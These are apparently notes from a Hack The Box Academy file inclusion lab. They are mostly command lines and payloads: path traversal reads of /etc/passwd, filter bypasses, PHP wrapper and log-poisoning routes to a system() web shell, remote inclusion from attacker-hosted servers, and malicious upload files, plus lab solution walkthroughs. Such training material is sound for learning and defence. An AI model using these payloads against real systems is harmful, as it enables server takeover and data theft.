...
http://<SERVER_IP>:<PORT>/
```
![basic_lfi_lang.png](https://academy.hackthebox.com/storage/modules/23/basic_lfi_lang.png)
...
```
![basic_lfi_es.png](https://academy.hackthebox.com/storage/modules/23/basic_lfi_es.png)
...
```
![basic_lfi_lang_passwd.png](https://academy.hackthebox.com/storage/modules/23/basic_lfi_lang_passwd.png)
...
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
```
![traversal_passwd_failed](https://academy.hackthebox.com/storage/modules/23/traversal_passwd_failed.png)
...
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
```
![traversal_passwd](https://academy.hackthebox.com/storage/modules/23/traversal_passwd.png)
...
http://<SERVER_IP>:<PORT>/index.php?language=../../../etc/passwd
```
![lfi_another_example1](https://academy.hackthebox.com/storage/modules/23/lfi_another_example1.png)
...
http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd
```
![lfi_another_example_passwd1](https://academy.hackthebox.com/storage/modules/23/lfi_another_example_passwd1.png)
...
```
![lfi_extension_failed](https://academy.hackthebox.com/storage/modules/23/lfi_extension_failed.png)
...
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
```
![lfi_blacklist](https://academy.hackthebox.com/storage/modules/23/lfi_blacklist.png)
...
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
```
![lfi_blacklist_passwd](https://academy.hackthebox.com/storage/modules/23/lfi_blacklist_passwd.png)
...
```
![lfi_blacklist_passwd_filter](https://academy.hackthebox.com/storage/modules/23/lfi_blacklist_passwd_filter.png)
...
```
user@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
...
Solution: if we perform some test, we see that the path must start for `languages/<random_char>` otherwise we get an `Illegal path specified` message. Furthermore, we note that there is no constrain on the final extension, but if we start to write `languages/../../../es.php`, we get the spanish language in the result. It means that `../` character (and its URL encoding) will be removed. A good solution to bypass it is to write `../` as `....//` (also `..././` or `....////`) so our complete path could be `languages/....//....//....//....//etc/passwd`. Now we can find `/flag.txt`.
...
```
user@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
...
```
![lfi_config_failed](https://academy.hackthebox.com/storage/modules/23/lfi_config_failed.png)
...
```
![lfi_config_wrapper](https://academy.hackthebox.com/storage/modules/23/lfi_config_wrapper.png)
...
```
user@htb[/htb]$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
...
```
user@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>
...
```
user@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
...
```
user@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64
...
```
![data_wrapper_id](https://academy.hackthebox.com/storage/modules/23/data_wrapper_id.png)

We may also use cURL for the same attack, as follows:
```
user@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
...
```
user@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
...
```
user@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```
...
```
user@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
...
```
![lfi_local_url_include](https://academy.hackthebox.com/storage/modules/23/lfi_local_url_include.jpg)
...
```
user@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
...
```
user@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
...
```
![rfi_localhost](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)
...
```
user@htb[/htb]$ sudo python -m pyftpdlib -p 21
...
```
user@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
...
```
user@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
...
```
![windows_rfi](https://academy.hackthebox.com/storage/modules/23/windows_rfi.png)
...
```
user@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
...
```
![lfi_upload_gif](https://academy.hackthebox.com/storage/modules/23/lfi_upload_gif.jpg)
...
```
![lfi_include_uploaded_gif](https://academy.hackthebox.com/storage/modules/23/lfi_include_uploaded_gif.jpg)
...
```
user@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
...
```
user@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
...
![rfi_cookies_storage](https://academy.hackthebox.com/storage/modules/23/rfi_cookies_storage.png)
...
```
![rfi_session_include](https://academy.hackthebox.com/storage/modules/23/rfi_session_include.png)
...
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
![lfi_poisoned_sessid](https://academy.hackthebox.com/storage/modules/23/lfi_poisoned_sessid.png)
...
```
![rfi_session_id](https://academy.hackthebox.com/storage/modules/23/rfi_session_id.png)
...
```
![rfi_access_log](https://academy.hackthebox.com/storage/modules/23/rfi_access_log.png)
...
![rfi_repeater_ua](https://academy.hackthebox.com/storage/modules/23/rfi_repeater_ua.png)
...
![rfi_cmd_repeater](https://academy.hackthebox.com/storage/modules/23/rfi_cmd_repeater.png)

We may also poison the log by sending a request through cURL, as follows:
```
user@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'
```
...
![rfi_id_repeater](https://academy.hackthebox.com/storage/modules/23/rfi_id_repeater.png)

We see that we successfully executed the command. The exact same attack can be with carried out on **Nginx** logs as well.
...
```
user@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
...
```
user@htb[/htb]$ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
...
```
user@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
...
```
user@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
...
```
user@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
...
```
user@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
...
Solution: The interesting parameter is `page` that appends `.php` string after the input value and prohibits the `..` or its URL encoding, so we can only read the source PHP files. We can do it by using the PHP wrapper for getting Base64 string of the source PHP code files:
```
http://SERVER_IP:PORT/index.php?page=php://filter/read=convert.base64-encode/resource=index
```
By decoding `index.php`, we can observe a `ilf_admin/index.php`. If we can access there, we go to the Admin Panel used for checking log files. There, we can note the `log` parameter that we can use for reading back-end server files as `../../../../../../../../../../../etc/passwd`. This `log` parameter does not seem to have some security filter.

We need to get an RCE. For doing this, we can leverage on NGINX log files as `/var/log/nginx/access.log` and `/var/log/nginx/error.log` (remember to use `./../../../../../../../../../../` as prefix). We can manipulate `User-Agent` for checking if we can inject PHP code. So, we can execute `curl -s http://SERVER_IP:PORT/index.php -A '<?php system($_GET[\"cmd\"]); ?>` (or use it by Burp Repeater with no double quotes). After it, we can go to `http://167.71.137.246:30346/ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log&cmd=id` and by accessing to the `access.log`, search for (CTRL+F) `uid=` string and you should find the `id` command output. Now you can leverage on the previous link to inject other commands for getting the flag.